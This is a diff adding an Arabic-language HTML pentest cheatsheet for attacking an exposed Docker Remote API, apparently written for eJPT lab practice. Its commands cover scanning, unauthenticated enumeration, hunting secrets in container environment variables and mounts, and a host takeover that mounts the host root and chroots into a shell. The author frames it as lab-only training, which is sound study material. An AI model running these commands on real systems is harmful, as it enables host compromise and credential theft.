@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Docker API Cheatsheet — 2375 / 2376</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORT 2375 / 2376 — DOCKER REMOTE API</span>
+<h1>Docker API — من الفحص إلى ما بعد الاستغلال</h1>
+<p>Quick Service Reference — مرجع عملي أثناء الـLab لاكتشاف وتعداد واختبار Docker Remote API بشكل مصرح.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote">
+<b>ملاحظة عن البورت:</b> 2375/TCP شائع للاتصال غير المشفر، و2376/TCP شائع مع TLS، لكن كلاهما قابل للتغيير.
+  إذا لم تظهر الخدمة عليهما، استخدم فحص <code style="direction:ltr;display:inline-block">-p-</code> قبل استبعاد Docker Remote API.
+</div>
+<div class="toc">
+<span class="ttl">المراحل</span>
+<ol>
+<li><a href="#s1">1. Reconnaissance</a></li>
+<li><a href="#s2">2. Port Scanning</a></li>
+<li><a href="#s3">3. Enumeration</a></li>
+<li><a href="#s4">4. Credential Testing</a></li>
+<li><a href="#s5">5. Exploitation</a></li>
+<li><a href="#s6">6. Post-Exploitation</a></li>
+</ol>
+</div>
+<div class="stage" id="s1">
+<h2>1. Reconnaissance</h2>
+<p class="desc">ابدأ بتأكيد شبكتك والوصول للهدف، ثم ابحث عن مؤشرات أن الهدف يشغّل Docker أو خدمات إدارة حاويات.</p>
+<h3 class="sub">تحديد الشبكة والمسار</h3>
+<div class="step">
+<div class="step-title">Identify Local Interface <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip a</div>
+<div class="note">اعرف عنوان جهازك والواجهة المستخدمة.</div>
+</div>
+<div class="step">
+<div class="step-title">Review Network Route <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip route</div>
+<div class="note">تأكد من مسار الشبكة والـgateway.</div>
+</div>
+<h3 class="sub">اختبار الوصول واكتشاف الأجهزة</h3>
+<div class="step">
+<div class="step-title">Test Target Reachability <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ping -c 4 [TARGET]</div>
+<div class="note">عدم الرد لا يعني أن الهدف Down؛ ICMP قد يكون محجوب.</div>
+</div>
+<div class="step">
+<div class="step-title">Discover Live Hosts <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -sn [SUBNET]</div>
+<div class="note">استخدمه داخل Lab لاكتشاف الأجهزة الحية.</div>
+</div>
+<div class="tip">2375/TCP غالبًا Docker Remote API بدون TLS، بينما 2376/TCP يُستخدم عادةً مع TLS. لا تعتبر هذا قاعدة مطلقة؛ يمكن تغيير البورتين.</div>
+</div>
+<div class="stage" id="s2">
+<h2>2. Port Scanning</h2>
+<p class="desc">افحص 2375 و2376 أولًا، ثم اعمل Full TCP scan لأن Docker API قد يُنقل إلى بورت مختلف.</p>
+<h3 class="sub">الفحص الأساسي</h3>
+<div class="step">
+<div class="step-title">Detect Docker API Service <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p2375,2376 -sV [TARGET]</div>
+<div class="note">ابدأ بتحديد حالة البورتين والخدمة الظاهرة.</div>
+<div class="result">GENERAL REFERENCE — النجاح = Nmap يعرّف Docker API أو يؤكد HTTP/TLS على البورت المتوقع.</div></div>
+<div class="step">
+<div class="step-title">Fingerprint Docker API Service <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p2375,2376 -sC -sV [TARGET]</div>
+<div class="note">شغّل default scripts مع version detection.</div>
+</div>
+<h3 class="sub">الفحص الشامل</h3>
+<div class="step">
+<div class="step-title">Find Non-Standard Docker Port <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p- --min-rate 1000 [TARGET]</div>
+<div class="note">إذا ما ظهر Docker على البورتات الشائعة، افحص كل TCP ports داخل الـLab.</div>
+</div>
+<div class="step">
+<div class="step-title">Confirm Discovered Docker Port <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p[PORT] -sV -sC [TARGET]</div>
+<div class="note">أعد الفحص على البورت الفعلي الذي وجدته.</div>
+</div>
+<h3 class="sub">تأكيد HTTP API</h3>
+<div class="step">
+<div class="step-title">Check Docker API Availability over HTTP <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -i http://[TARGET]:[PORT]/_ping</div>
+<div class="note">إذا كانت API بدون TLS ومتاحة، غالبًا يرجع endpoint بسيط يثبت أن الخدمة تستجيب.</div>
+</div>
+<div class="step">
+<div class="step-title">Check Docker API Availability over HTTPS <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -sk -i https://[TARGET]:[PORT]/_ping</div>
+<div class="note">استخدم HTTPS إذا كان البورت يعمل بـTLS.</div>
+</div>
+<div class="danger">لا تفترض أن 2376 يعني TLS دائمًا أو أن 2375 يعني No-Auth دائمًا. أكد السلوك فعليًا بالـHTTP/TLS requests.</div>
+</div>
+<div class="stage" id="s3">
+<h2>3. Enumeration</h2>
+<p class="desc">حدد هل الـAPI مكشوفة بدون مصادقة، وما هي نسخة Docker، والحاويات، والصور، والشبكات المتاحة.</p>
+<h3 class="sub">معلومات النسخة والنظام</h3>
+<div class="step">
+<div class="step-title">Get Docker Version <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s http://[TARGET]:[PORT]/version | jq</div>
+<div class="note">يعرض Version وAPI version ومعلومات runtime إذا endpoint متاح.</div>
+</div>
+<div class="step">
+<div class="step-title">Get Docker System Information <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s http://[TARGET]:[PORT]/info | jq</div>
+<div class="note">يعرض معلومات Docker daemon العامة مثل عدد الحاويات والصور والتخزين.</div>
+</div>
+<h3 class="sub">الحاويات والصور</h3>
+<div class="step">
+<div class="step-title">List All Containers <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s 'http://[TARGET]:[PORT]/containers/json?all=1' | jq</div>
+<div class="note">اعرض جميع الحاويات، وليس الحاويات العاملة فقط.</div>
+<div class="result">GENERAL REFERENCE — النجاح = ظهور Containers/resources التي يسمح الـdaemon بعرضها.</div></div>
+<div class="step">
+<div class="step-title">List Images <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s http://[TARGET]:[PORT]/images/json | jq</div>
+<div class="note">اعرض الصور الموجودة محليًا على الهدف.</div>
+</div>
+<div class="step">
+<div class="step-title">List Networks <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s http://[TARGET]:[PORT]/networks | jq</div>
+<div class="note">استخرج Docker networks المتاحة.</div>
+</div>
+<h3 class="sub">تفاصيل حاوية محددة</h3>
+<div class="step">
+<div class="step-title">Inspect Container Configuration <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s http://[TARGET]:[PORT]/containers/[CONTAINER_ID]/json | jq</div>
+<div class="note">افحص Mounts وEnv وNetworkSettings وConfig للحاوية.</div>
+</div>
+<div class="tip">ابحث داخل Env وMounts عن أسرار أو paths حساسة مثل كلمات مرور DB، tokens، bind mounts، أو docker.sock.</div>
+<h3 class="sub">Docker CLI بدل curl</h3>
+<div class="step">
+<div class="step-title">Verify Docker CLI API Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] version</div>
+<div class="note">إذا كان Docker CLI مثبتًا والخدمة بدون TLS، هذا يختبر الاتصال مباشرة.</div>
+</div>
+<div class="step">
+<div class="step-title">List Containers with Docker CLI <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] ps -a</div>
+<div class="note">اعرض الحاويات من خلال Docker CLI.</div>
+</div>
+<div class="step">
+<div class="step-title">List Images with Docker CLI <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] images</div>
+<div class="note">اعرض الصور المتاحة على الـdaemon.</div>
+</div>
+<h3 class="sub">TLS Enumeration</h3>
+<div class="step">
+<div class="step-title">Inspect Docker TLS Certificate <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">openssl s_client -connect [TARGET]:[PORT] -showcerts</div>
+<div class="note">افحص الشهادة إذا كانت الخدمة تستخدم TLS.</div>
+</div>
+<div class="step">
+<div class="step-title">Test mTLS Version Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl --cert [CLIENT_CERT] --key [CLIENT_KEY] --cacert [CA_CERT] https://[TARGET]:[PORT]/version</div>
+<div class="note">إذا عندك client certificate مصرح، اختبر mTLS بهذه الطريقة.</div>
+</div>
+<div class="danger">قراءة Env أو Mounts قد تكشف أسرارًا حقيقية. داخل Lab فقط، ولا تنسخ بيانات خارج نطاق الاختبار.</div>
+</div>
+<div class="stage" id="s4">
+<h2>4. Credential Testing</h2>
+<p class="desc">Docker Remote API عادةً لا يعتمد username/password مثل SSH. الحماية الشائعة تكون Network ACL أو TLS/mTLS، لذلك لا تستخدم brute-force عشوائي.</p>
+<h3 class="sub">تحديد هل الخدمة بدون مصادقة</h3>
+<div class="step">
+<div class="step-title">Check Unauthenticated API Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -i http://[TARGET]:[PORT]/version</div>
+<div class="note">إذا رجعت معلومات النسخة مباشرة فهذا مؤشر قوي أن الـAPI متاحة بدون مصادقة على هذا المسار.</div>
+<div class="result">GENERAL REFERENCE — إذا رجعت معلومات النسخة بدون credentials فهذا وصول غير موثق للـAPI على هذا المسار.</div></div>
+<div class="step">
+<div class="step-title">Confirm Unauthenticated Docker CLI Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] info</div>
+<div class="note">أكد من Docker CLI أن الـdaemon يقبل أوامرك بدون شهادات.</div>
+</div>
+<h3 class="sub">اختبار mTLS عند توفر الشهادات</h3>
+<div class="step">
+<div class="step-title">Test Authorized mTLS Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker --tlsverify --tlscacert=[CA_CERT] --tlscert=[CLIENT_CERT] --tlskey=[CLIENT_KEY] -H tcp://[TARGET]:[PORT] info</div>
+<div class="note">اختبر الشهادات المصرح بها بدل محاولات password guessing غير المناسبة.</div>
+<div class="result">GENERAL REFERENCE — النجاح = قبول الشهادات وإرجاع معلومات الـdaemon ضمن صلاحياتها.</div></div>
+<div class="step">
+<div class="step-title">Verify Client Certificate Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl --cert [CLIENT_CERT] --key [CLIENT_KEY] --cacert [CA_CERT] https://[TARGET]:[PORT]/_ping</div>
+<div class="note">تحقق من صحة client certificate يدويًا.</div>
+</div>
+<h3 class="sub">البحث عن مفاتيح وشهادات معاد استخدامها</h3>
+<div class="step">
+<div class="step-title">Locate Docker TLS Materials <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">find [DIR] -type f \( -name '*.pem' -o -name '*.crt' -o -name '*.key' \) 2&gt;/dev/null</div>
+<div class="note">داخل ملفات الـLab أو بعد وصول مصرح، ابحث عن مواد TLS التي قد تخص Docker.</div>
+</div>
+<div class="step">
+<div class="step-title">Find Docker Client Configuration <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">grep -RniE 'DOCKER_HOST|DOCKER_TLS_VERIFY|DOCKER_CERT_PATH' [DIR] 2&gt;/dev/null</div>
+<div class="note">ابحث عن إعدادات Docker client محفوظة في scripts أو configs.</div>
+</div>
+<div class="tip">لا تستخدم Hydra على Docker API. لو الخدمة محمية بـmTLS، المطلوب شهادات صحيحة وليس username/password تقليدي.</div>
+</div>
+<div class="stage" id="s5">
+<h2>5. Exploitation</h2>
+<p class="desc">إذا كانت Docker API مكشوفة بدون مصادقة، فأنت غالبًا تتحكم بالـdaemon. اختبر التأثير تدريجيًا داخل الـLab وابدأ بإثبات منخفض التأثير.</p>
+<h3 class="sub">إثبات تحكم منخفض التأثير</h3>
+<div class="step">
+<div class="step-title">Create Test Container and Verify Command Execution <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] run --rm alpine id</div>
+<div class="note">يشغّل حاوية مؤقتة ويثبت أن بإمكانك إنشاء workloads عبر الـdaemon.</div>
+</div>
+<div class="step">
+<div class="step-title">Verify Test Container Runtime <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] run --rm alpine uname -a</div>
+<div class="note">اختبار بسيط إضافي بدون إبقاء حاوية دائمة.</div>
+</div>
+<h3 class="sub">فحص host filesystem exposure بشكل مشروط</h3>
+<div class="step">
+<div class="step-title">Verify Read-Only Host Mount <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] run --rm -v /:/host:ro alpine ls -la /host</div>
+<div class="note">اختبر فقط داخل Lab إن كان الـdaemon يسمح bind mount للـhost. استخدم read-only أولًا.</div>
+</div>
+<div class="step">
+<div class="step-title">Read Host OS Through Mount <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] run --rm -v /:/host:ro alpine cat /host/etc/os-release</div>
+<div class="note">يعطيك معلومات نظام الـhost من mount read-only بدون تعديل الملفات.</div>
+</div>
+<div class="danger">الوصول إلى Docker daemon غالبًا يعادل صلاحيات عالية على الـhost. لا تستخدم write mounts أو privileged containers على أي نظام غير مصرح به.</div>
+<h3 class="sub">Host access داخل Lab عند الحاجة لإثبات الأثر</h3>
+<div class="step">
+<div class="step-title">Test Host Filesystem Shell Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">docker -H tcp://[TARGET]:[PORT] run --rm -it -v /:/host alpine chroot /host /bin/sh</div>
+<div class="note">مسار Lab شائع لإظهار أن التحكم بالـdaemon يمكن أن يتحول إلى shell على الـhost. يعتمد على توفر shell والـfilesystem.</div>
+</div>
+<div class="danger">هذا الأمر عالي التأثير لأنه ينقلك فعليًا إلى بيئة ملفات الـhost. استخدمه فقط إذا كان هدف الـLab إثبات host compromise.</div>
+<h3 class="sub">Docker API مباشرة بدون Docker CLI</h3>
+<div class="step">
+<div class="step-title">Create Test Container via REST API <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["id"]}' http://[TARGET]:[PORT]/containers/create?name=[NAME] | jq</div>
+<div class="note">ينشئ حاوية عبر REST API مباشرة.</div>
+</div>
+<div class="step">
+<div class="step-title">Start Test Container via REST API <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s -X POST http://[TARGET]:[PORT]/containers/[CONTAINER_ID]/start</div>
+<div class="note">شغّل الحاوية التي أنشأتها.</div>
+</div>
+<div class="step">
+<div class="step-title">Inspect Test Container Result <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">curl -s 'http://[TARGET]:[PORT]/containers/[CONTAINER_ID]/logs?stdout=1&amp;stderr=1'</div>
+<div class="note">اعرض مخرجات الحاوية.</div>
+<div class="result">GENERAL REFERENCE — النجاح = ظهور نتيجة الأمر الذي شُغّل داخل test container؛ احذف/استخدم --rm حيث يغطيه الـworkflow الحالي.</div></div>
+<div class="tip">إذا احتجت impact أكبر، اربطه بهدف الـLab فقط. لا تقفز مباشرة إلى privileged أو write mounts بدون سبب.</div>
+</div>
+<div class="stage" id="s6">
+<h2>6. Post-Exploitation</h2>
+<p class="desc">بعد إثبات التحكم، اجمع الحد الأدنى من المعلومات المهمة وحدد هل الوصول داخل container أو فعليًا على الـhost.</p>
+<h3 class="sub">تأكيد السياق داخل الحاوية</h3>
+<div class="step">
+<div class="step-title">Verify Current UID/GID <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">id</div>
+<div class="note">حدد UID/GID الحالي.</div>
+</div>
+<div class="step">
+<div class="step-title">Verify Current Host <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">hostname</div>
+<div class="note">اعرف hostname الحالي.</div>
+</div>
+<div class="step">
+<div class="step-title">Check Container Context <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">cat /proc/1/cgroup</div>
+<div class="note">يساعدك على معرفة هل أنت داخل container حسب البيئة.</div>
+</div>
+<h3 class="sub">إذا وصلت للـhost عبر chroot أو shell مباشر</h3>
+<div class="step">
+<div class="step-title">Verify Host User <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami</div>
+<div class="note">أكد هوية المستخدم على الـhost.</div>
+</div>
+<div class="step">
+<div class="step-title">Identify Host OS <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">cat /etc/os-release</div>
+<div class="note">حدد نظام التشغيل وإصداره.</div>
+</div>
+<div class="step">
+<div class="step-title">Review Host Network Interfaces <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">ip a</div>
+<div class="note">حدد واجهات الشبكة المتاحة على الـhost.</div>
+</div>
+<h3 class="sub">مراجعة Docker artifacts</h3>
+<div class="step">
+<div class="step-title">List Host Containers <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">docker ps -a</div>
+<div class="note">إذا Docker CLI متوفر على الـhost، اعرض الحاويات.</div>
+</div>
+<div class="step">
+<div class="step-title">Inspect Host Container <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">docker inspect [CONTAINER_ID]</div>
+<div class="note">راجع Mounts وEnv وNetworks للحاوية المهمة.</div>
+</div>
+<div class="step">
+<div class="step-title">List Docker Networks <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">docker network ls</div>
+<div class="note">اعرض الشبكات الداخلية التي قد تكون مهمة للـpivoting لاحقًا.</div>
+</div>
+<div class="tip">بعد تأكيد الوصول، انتقل لملف Linux Post-Exploitation وPivoting العام عندك بدل تكرار كل خطوات ما بعد الاستغلال هنا.</div>
+<div class="danger">لا تحذف containers أو images ولا توقف workloads حقيقية. في Lab استخدم --rm للحاويات التجريبية متى أمكن.</div>
+</div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div>
+</body>
+</html>
